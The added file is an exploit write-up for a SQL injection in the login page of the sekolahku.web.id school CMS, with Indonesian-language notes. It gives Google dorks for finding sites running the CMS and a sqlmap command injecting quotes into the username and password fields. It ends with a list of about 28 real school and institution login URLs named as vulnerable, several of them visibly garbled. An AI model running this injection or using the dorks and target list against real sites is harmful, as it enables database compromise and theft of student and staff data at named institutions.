@@ -1,0 +1,54 @@
+# Exploit Title: SQL Injection CMS sekolahku.web.id 
+# Google Dork: :
+inurl:/ppdb/statistik/ intext:Developed by sekolahku.web.id 
+intext:Developed by sekolahku.web.id
+inurl:/home/siswa
+# Date: 07/11/2018
+# Exploit Author: Arik Alfiki
+# Vendor Homepage: https://sekolahku.web.id/
+# Software Link: https://sekolahku.web.id/
+# Version: 1.4.x
+# Tested on: WiN7_x64/KaLiLinuX x64
+# Description: CMS sekolahku.web.id pada halaman login terdapat Bug SQL Injection pada Metodh
+Post data.
+# Memanfaatkan masalah ini dapat memungkinkan penyerang mengkompromikan aplikasi,
+# mengakses atau memodifikasi data, atau mengeksploitasi kerentanan laten dalam database yang
+mendasarinya.
+# CVE :
+
+#POC
+#how to inject?
+# sqlmap -u "localhost" --data="username=SQL'&password=SQL'"
+
+
+
+#list vuln :
+http://smknlpayakumbuh.sch.id/login
+http://web.sma2payakumbuh.sch.id/login
+http: //www.kampus.smanl3garut.sch.id/login
+http://mamodelhafshawaty.sch.id/login
+https: //www.sma-muhammadiyah-singkut.sch.id/login|
+http://www.mangenteng.sch.id/login I
+http://sman3surabaya.sch.id/login
+http://www.smknlbalige.sch.id/login
+http://web.smkn3-magelang.sch.id/login
+http: //www.smkmuhammadiyahpamotan.sch.id/login
+http://www.smkstiaralahat.sch.id/login
+http://www.aak-malang.ac.id/login
+https://smp.borcess.id/login
+http://smanlprambanan.sch.id/web/login
+http://smp2kramattegal.sch.id/login
+http://ppdb.smknlbinuang.sch.id/login
+http://sman3kotasukabumi.sch.id/login
+http: //www.smkkr2tomohon.sch.id/login
+http://quranhomestay.com/login
+http://www.smkss2.bungokab.go.id/login
+https://smp.webskul.com/login
+https://www.smknlmerangin.sch.id/login
+http://www.smpnl2sby.sch.id/login
+http://www.smknlpalangkaraya.sch.id/index.php/login
+http://www.pcmsirampog.or.id/login
+http://www.mtsn38jkt.sch.id/login
+https://www.smpn42bekasikota.sch.id/login
+https://www.mtsn21ljkt.sch.id/login
+
